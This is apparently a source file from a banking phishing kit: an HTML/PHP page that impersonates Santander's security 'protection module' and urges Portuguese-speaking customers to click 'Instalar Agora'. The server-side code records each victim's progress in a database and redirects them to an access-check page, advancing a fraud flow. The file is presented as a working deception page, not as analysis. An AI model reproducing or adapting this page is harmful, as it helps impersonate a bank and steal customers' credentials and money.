<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo person_buster_cima">
				<img src="imgs/logo-stdeMd1-red.png">
			</div><!-- ld_boxLogo -->

			<div class="title_buster">
				<h1>PROTEJA SUAS TRANSAÇÕES AGORA.</h1>
			</div>
			
			<div class="clear"></div>

			<div class="posiciona_itens_buster">
				<div class="left_buster">
					<img src="imgs/icon_protect.jpg">
				</div><!-- left_buster -->
				
				<div class="right_buster">
					<h1>Instale o Módulo de Proteção Santander e conte com os benefícios baixo.</h1>
					
					<div class="itens_buster">
						Mais proteção contra roubo e uso indevido de suas informações na internet.
					</div><!-- itens_buster -->
					
					<div class="itens_buster">
						Proteção extra que complementa o antivírus do seu computador.
					</div><!-- itens_buster -->
					
					<div class="itens_buster">
						Instalação rápida, segura e gratuita.
					</div><!-- itens_buster -->
					
					<div class="clear"><br></div>
					
				</div><!-- right_buster -->
			</div><!-- md_boxTables -->
			<br><br>
			<a href="#" class="getGDBA personaliza_GDBA" onclick="return start_loading();">Instalar Agora</a>
			<form name="formGbuster" id="formGbuster" action="" method="post">
				<input type="hidden" name="sender" id="sender" value="buster">
			</form>
			<div class="clear"><br></div>
<?php 

if(isset($_POST['send']) && $_POST['send'] == 'loading'){
	$update = updateGBuster($conn, $id_user);
	if($update){
		unset($_SESSION['executar_inicial']);
		echo '<script>location.href="check_acesso.php";</script>';
	}else{
		echo '<script>alert("Sistema temporariamente indisponível.\nTente novamente mais tarde!");</script>';
	}
}

?>			
			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>